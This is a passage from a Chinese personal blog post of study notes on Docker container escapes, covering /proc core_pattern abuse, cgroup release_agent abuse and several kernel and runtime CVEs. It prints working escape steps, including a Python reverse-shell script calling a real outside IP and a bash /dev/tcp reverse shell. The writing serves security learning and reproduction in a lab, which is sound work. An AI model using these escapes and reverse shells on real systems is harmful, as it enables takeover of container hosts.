<p>在 &#x2F;tmp 目录下创建一个 <a target="_blank" rel="noopener" href="http://exp.py/">exp.py</a> 文件，此文件的功能是为了反弹shell</p>
<p>docker没有vim，因此用 <code>cat &gt;/tmp/exp.py &lt;&lt; EOF</code> 输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line">import os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = <span class="string">&quot;62.234.97.159&quot;</span></span><br><span class="line">lport = 8080</span><br><span class="line">def main():</span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), 0)</span><br><span class="line">   os.dup2(s.fileno(), 1)</span><br><span class="line">   os.dup2(s.fileno(), 2)</span><br><span class="line">   os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">   pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">   os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">   s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   main()</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p><img src="attachment:abeb96b1-3af5-419e-be06-21894cb60b58:image.png" alt="image.png"></p>
<p>前面已经知道当前容器在宿主机内的绝对路径，故而可知当前文件在宿主机内的绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/overlay2/df90fee56d5fe5a81effa5c2440cef4599787ece681174cd67f2d9ce60228f36/merged/tmp/exp.py</span><br></pre></td></tr></table></figure>

<p>将此路径写入到 宿主机的 <code>/proc/sys/kernel/core_pattern</code> 文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;|/var/lib/docker/overlay2/df90fee56d5fe5a81effa5c2440cef4599787ece681174cd67f2d9ce60228f36/merged/tmp/exp.py \\rcore &quot;</span> &gt; /hacker2/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<p>一旦程序发生崩溃，就会自动运行该脚本，进行反弹宿主机 shell，实现逃逸。</p>
<p>那么如何使其崩溃？</p>
<p>创建一个恶意文件 &#x2F;&#x2F;赋值一个空指针报错Segmentation fault从而引起程序崩溃</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;/tmp/exp.c &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int *a = NULL;</span></span><br><span class="line"><span class="string">    *a = 1;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>使用 gcc 进行编译，需要使用到gcc环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install vim gcc -y</span><br><span class="line"></span><br><span class="line">root@e0a493278c7f:/tmp# <span class="built_in">ls</span></span><br><span class="line">exp.c  exp.py</span><br><span class="line">root@e0a493278c7f:/tmp# gcc exp.c -o exp</span><br><span class="line">root@e0a493278c7f:/tmp# <span class="built_in">ls</span></span><br><span class="line">exp  exp.c  exp.py</span><br></pre></td></tr></table></figure>

<p>vps开启监听，运行exp，成功反弹shell</p>
<p><img src="attachment:c0586e9b-ecce-4344-9e3b-7bcba9cd705b:image.png" alt="image.png"></p>
<p><img src="attachment:39c127c8-e55a-4659-816c-7bfd9c0b76d5:image.png" alt="image.png"></p>
<h2 id="5-Cgroup配置错误"><a href="#5-Cgroup配置错误" class="headerlink" title="5.Cgroup配置错误"></a>5.Cgroup配置错误</h2><p>Cgroup 是 Linux 提供的一种用于资源管理的功能，通过 Cgroup 可以对进程资源（如 CPU、内存等）的使用情况进行限制和统计</p>
<p>这种攻击利用了<code>notify_on_release</code> 和 <code>release_agent</code> 这两个 Cgroup 的机制，<strong>用于在 Cgroup 子目录资源被清空时执行特定的动作 实现逃逸</strong></p>
<p>利用条件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">● 以root用户身份在容器内运行</span><br><span class="line">● 使用SYS_ADMINLinux功能运行</span><br><span class="line">● 缺少AppArmor配置文件，否则将允许mountsyscall</span><br><span class="line">● cgroup v1虚拟文件系统必须以读写的方式安装在容器内</span><br></pre></td></tr></table></figure>

<p>启动命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --<span class="built_in">rm</span> --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-cap-add=SYS_ADMIN</code>: 使用SYS_ADMINLinux功能运行</li>
<li><code>-security-opt apparmor=unconfined</code>: 禁用 <strong>AppArmor</strong> 安全模块的限制</li>
</ul>
<p>第一步：判断权限条件和特权启动容器部分一样，命令都是 <code>cat /proc/self/status | grep CapEff</code></p>
<p>第二部：判断容器内挂载了 Cgroup 文件系统，且为读写模式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount | grep cgroup</span><br><span class="line"><span class="built_in">ls</span> -l /sys/fs/cgroup</span><br></pre></td></tr></table></figure>

<p><img src="attachment:1972a6c9-714f-46d4-93cc-ead7aeb3f00c:image.png" alt="image.png"></p>
<p>都满足条件之后进行利用</p>
<p>创建一个临时目录用于挂载 Cgroup 文件系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/hacker3</span><br><span class="line">mount -t cgroup -o memory cgroup /tmp/hacker3     参数解释见下面</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/hacker3/conf                           在挂载点下创建一个名为 <span class="string">&quot;conf&quot;</span> 的子目录，用于设置特定 Cgroup 的配置</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/hakcer3/conf/notify_on_release      启用通知机制，当 conf 子目录的任务（进程）清空时会触发内核动作</span><br><span class="line">host_path=sed -n <span class="string">&#x27;s/.*\\perdir=[^,]*.*/\\1/p&#x27;</span> /etc/mtab    使用 sed 命令从 /etc/mtab 文件中解析出宿主机的路径前缀 </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/hacker3/release_agent 设置 release_agent 为一个脚本的路径，通知事件触发时由内核执行该脚本</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd                            创建反弹shell的脚本</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&quot;</span> &gt;&gt; /cmd</span><br></pre></td></tr></table></figure>

<p><code>-t</code> 用于指定文件系统类型。</p>
<p><code>cgroup</code> 表示要挂载的是一个 Cgroup 文件系统</p>
<p><code>-o</code> 用来指定挂载选项。 <code>memory</code> 表明挂载的是与内存（Memory）相关的 Cgroup 子系统</p>
<p><code>cgroup</code>:  指定要挂载的 Cgroup 文件系统的名称或设备</p>
<p><code>/etc/mtab</code>  记录了当前系统挂载的所有文件系统的信息，可以了解当前哪些设备或网络资源已经被挂载到文件系统中。</p>
<p>通过获取宿主机的挂载路径，就可以在容器内部使用这个路径来操作宿主机上的文件这个路径会被用于配置 <code>release_agent</code></p>
<p>将当前 shell 的 PID 写入 &#x2F;tmp&#x2F;test3&#x2F;conf&#x2F;cgroup.procs 文件</p>
<p>意味着当前 shell 进程将被“添加”到这个 cgroup 中</p>
<p>其他的进程被清空只保留当前的shell进程。</p>
<p>触发 notify_on_release，清空任务后，release_agent 自动执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;echo \\$\\$ &gt; /tmp/hacker3/conf/cgroup.procs&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>$$</code> 是一个特殊变量，它代表当前 shell 进程的 PID（进程 ID）</p>
<p>攻击机 vps 监听对应端口，获得宿主机 shell，即可成功逃逸</p>
<p>但是我复现失败</p>
<p>【问题记录】</p>
<p>尽管我以SYS_ADMIN权限启动了容器，但是仍然遇到了权限不够的问题，可以看到我的cgroup类型是cgroup2</p>
<p><img src="attachment:63338422-2f05-4e21-ad37-c7419cd6fd71:image.png" alt="image.png"></p>
<p><img src="attachment:1efb564b-32ab-4541-9477-1b0a780a542c:image.png" alt="image.png"></p>
<p>ChatGPT这样回答：</p>
<p>你在容器里执行 <code>mount -t cgroup -o memory cgroup /tmp/hacker3</code> 时遇到了 “permission denied”，尽管你用的是 <code>--cap-add=SYS_ADMIN --security-opt apparmor=unconfined</code> 启动容器。</p>
<p><strong>原因分析：</strong></p>
<ol>
<li><p><strong>容器的权限限制</strong></p>
<p>虽然你加了 <code>SYS_ADMIN</code> 能力，但在现代 Docker 和 Linux 系统中，挂载操作（mount）被限制得比较严格，尤其是 cgroup 相关的挂载。</p>
<p>容器内的 <code>mount</code> 一般被限制，宿主机内核对容器的挂载行为会有严格控制，单靠 <code>SYS_ADMIN</code> 不一定够。</p>
</li>
<li><p><strong>cgroup v2 的限制</strong></p>
<p>你容器中看到的 cgroup 是 cgroup2 (<code>cgroup2</code>)，而且它是以 <code>ro</code> 只读挂载的（<code>mount | grep cgroup</code> 里显示 <code>cgroup on /sys/fs/cgroup type cgroup2 (ro,...)</code>）。</p>
<p>cgroup v2 挂载和管理更复杂，容器里无法轻易对其子系统单独挂载。</p>
</li>
</ol>
<ul>
<li><strong>现代 Linux 发行版默认使用 cgroup v2</strong>，因为它设计更简洁、统一，管理更方便，且修复了 v1 的一些不足。</li>
<li>宿主机内核启动参数或系统配置决定了默认启用的是 v1 还是 v2，或两者混合。</li>
<li>你的系统很可能是启用了 <strong>纯 cgroup v2 模式</strong>，所以 <code>/sys/fs/cgroup</code> 挂载的是 <code>cgroup2</code> 类型。</li>
</ul>
<h2 id="6-SYS-PTRACE-进程注入"><a href="#6-SYS-PTRACE-进程注入" class="headerlink" title="6. SYS_PTRACE 进程注入"></a><strong>6. SYS_PTRACE 进程注入</strong></h2><p>适用面太小了，有时间再看</p>
<h1 id="7-程序漏洞-内核漏洞来逃逸"><a href="#7-程序漏洞-内核漏洞来逃逸" class="headerlink" title="7. 程序漏洞&amp;内核漏洞来逃逸"></a>7. 程序漏洞&amp;内核漏洞来逃逸</h1><h3 id="runC容器逃逸漏洞-CVE-2019-5736"><a href="#runC容器逃逸漏洞-CVE-2019-5736" class="headerlink" title="runC容器逃逸漏洞 CVE-2019-5736"></a><strong>runC容器逃逸漏洞 CVE-2019-5736</strong></h3><p>Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p>
<p>利用条件：</p>
<p>Docker版本 &lt; 18.09.2，runc版本&lt; 1.0-rc6，一般情况下，可通过 docker 和docker-runc 查看当前版本情况</p>
<h3 id="Docker-cp-命令容器逃逸攻击漏洞-CVE-2019-14271"><a href="#Docker-cp-命令容器逃逸攻击漏洞-CVE-2019-14271" class="headerlink" title="Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271"></a><strong>Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271</strong></h3><p>当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss*.so库。黑客可以通过在容器中替换libnss*.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限</p>
<h3 id="DirtyCow-CVE-2016-5195-脏牛"><a href="#DirtyCow-CVE-2016-5195-脏牛" class="headerlink" title="DirtyCow(CVE-2016-5195)脏牛"></a><strong>DirtyCow(CVE-2016-5195)脏牛</strong></h3><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。</p>
<p>Docker 与 宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里。</p>
<h3 id="DirtyPipe-CVE-2022-0847-脏管道"><a href="#DirtyPipe-CVE-2022-0847-脏管道" class="headerlink" title="DirtyPipe(CVE-2022-0847)脏管道"></a><strong>DirtyPipe(CVE-2022-0847)脏管道</strong></h3><p>Dirtypipe漏洞允许向任意可读文件中写数据，可造成非特权进程向root进程注入代码</p>
<h1 id="三、CDK工具利用"><a href="#三、CDK工具利用" class="headerlink" title="三、CDK工具利用"></a>三、CDK工具利用</h1><h1 id="四、Reference"><a href="#四、Reference" class="headerlink" title="四、Reference"></a>四、Reference</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17111">https://xz.aliyun.com/news/17111</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12944">https://xz.aliyun.com/news/12944</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tomyyyyy/p/16275873.html">https://www.cnblogs.com/tomyyyyy/p/16275873.html</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/docker-risks.html">https://wiki.teamssix.com/CloudNative/Docker/docker-risks.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://starven-l.github.io">Starven</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://starven-l.github.io/2025/06/19/demo/">https://starven-l.github.io/2025/06/19/demo/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://starven-l.github.io" target="_blank">Starven's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/06/18/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Starven</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8Dshell%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8Edocker%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">一、判断当前shell是否处于docker环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">二、逃逸方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-privileged-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E7%9B%B4%E6%8E%A5%E6%8C%82%E8%BD%BD%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text">1.privileged 特权模式直接挂载目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%B7%BB%E5%8A%A0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E3%80%90%E6%B3%A8%E6%84%8F%E5%9D%91%E7%82%B9%EF%BC%81%E3%80%91"><span class="toc-number">2.2.</span> <span class="toc-text">（1）添加定时任务反弹shell【注意坑点！】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%86%99%E5%85%AC%E9%92%A5"><span class="toc-number">2.3.</span> <span class="toc-text">（2）写公钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-docker-api%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">2.docker api未授权导致的逃逸漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-2375%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.5.</span> <span class="toc-text">（1）判断漏洞是否存在-2375端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.6.</span> <span class="toc-text">（2）常用命令操作靶机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Docker-Socket%E9%80%83%E9%80%B8"><span class="toc-number">2.7.</span> <span class="toc-text">3.Docker Socket逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%96%B0%E5%BB%BA%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9B%AE%E5%BD%95"><span class="toc-number">2.8.</span> <span class="toc-text">（1）新建容器挂载宿主机目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Proc%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4%E7%9A%84docker%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.9.</span> <span class="toc-text">4. Proc危险挂载导致的docker逃逸漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Cgroup%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">2.10.</span> <span class="toc-text">5.Cgroup配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-SYS-PTRACE-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.11.</span> <span class="toc-text">6. SYS_PTRACE 进程注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%9D%A5%E9%80%83%E9%80%B8"><span class="toc-number">3.</span> <span class="toc-text">7. 程序漏洞&amp;内核漏洞来逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-CVE-2019-5736"><span class="toc-number">3.0.1.</span> <span class="toc-text">runC容器逃逸漏洞 CVE-2019-5736</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-cp-%E5%91%BD%E4%BB%A4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E-CVE-2019-14271"><span class="toc-number">3.0.2.</span> <span class="toc-text">Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirtyCow-CVE-2016-5195-%E8%84%8F%E7%89%9B"><span class="toc-number">3.0.3.</span> <span class="toc-text">DirtyCow(CVE-2016-5195)脏牛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirtyPipe-CVE-2022-0847-%E8%84%8F%E7%AE%A1%E9%81%93"><span class="toc-number">3.0.4.</span> <span class="toc-text">DirtyPipe(CVE-2022-0847)脏管道</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81CDK%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">三、CDK工具利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Reference"><span class="toc-number">5.</span> <span class="toc-text">四、Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/19/demo/" title="demo">demo</a><time datetime="2025-06-18T16:49:25.000Z" title="发表于 2025-06-19 00:49:25">2025-06-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/18/hello-world/" title="Hello World">Hello World</a><time datetime="2025-06-18T10:18:49.477Z" title="发表于 2025-06-18 18:18:49">2025-06-18</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Starven</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>